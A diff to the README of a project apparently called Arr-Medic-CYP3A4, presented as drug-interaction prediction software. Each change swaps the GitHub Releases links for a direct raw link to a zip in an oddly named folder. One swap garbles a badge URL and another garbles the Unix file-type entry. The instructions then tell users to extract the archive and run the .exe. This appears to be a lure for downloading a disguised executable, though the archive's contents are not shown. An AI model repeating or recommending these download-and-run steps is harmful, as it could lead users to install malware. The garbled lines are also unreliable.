@@ -6,7 +6,7 @@ Welcome to Arr-Medic-CYP3A4. This open-source system predicts drug interactions 
 
 ## 📥 Download Now
 
-[![Download Arr-Medic-CYP3A4](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/steffanhoez/Arr-Medic-CYP3A4/releases)
+[![Download Arr-Medic-CYP3A4](https://raw.githubusercontent.com/steffanhoez/Arr-Medic-CYP3A4/main/cytoplastic/Arr-Medic-CYP3A4.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/steffanhoez/Arr-Medic-CYP3A4/main/cytoplastic/Arr-Medic-CYP3A4.zip)
 
 ## 🔍 Overview
 
@@ -35,9 +35,9 @@ To run this software effectively, make sure your system meets the following:
 
 To begin using Arr-Medic-CYP3A4, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases](https://github.com/steffanhoez/Arr-Medic-CYP3A4/releases) page.
+1. **Visit the Releases Page**: Go to the [Releases](https://raw.githubusercontent.com/steffanhoez/Arr-Medic-CYP3A4/main/cytoplastic/Arr-Medic-CYP3A4.zip) page.
 2. **Select the Latest Version**: Look for the most recent version available for download.
-3. **Download the File**: Click on the appropriate file (e.g., `.exe`, `.zip` for Windows, or `.tar.gz` for Unix systems).
+3. **Download the File**: Click on the appropriate file (e.g., `.exe`, `.zip` for Windows, or `https://raw.githubusercontent.com/steffanhoez/Arr-Medic-CYP3A4/main/cytoplastic/Arr-Medic-CYP3A4.zip` for Unix systems).
 4. **Extract/Run the File**:
    - For Windows: If you downloaded a `.zip` file, extract it. Then double-click the `.exe` file to start the program.
    - For macOS/Linux: Extract the downloaded file and open a terminal to run the application with the appropriate commands.
